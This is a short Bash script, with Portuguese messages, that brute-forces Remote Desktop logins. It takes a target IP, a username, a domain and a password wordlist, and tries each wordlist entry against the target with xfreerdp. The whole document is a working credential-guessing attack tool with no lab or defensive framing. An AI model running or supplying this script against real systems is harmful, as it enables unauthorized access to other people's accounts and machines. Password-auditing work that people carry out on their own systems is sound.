#!/bin/bash

if [ "$3" == "" ];
then
	echo "Modo de usar: $0 127.0.0.1 usuario dominio wordlist.txt"
else
	for pass in $(cat "$4");
	do
	echo "Testando Senha: $pass"
	xfreerdp /u:$2 /d:$3 /p:$pass /v:$1
	done
fi
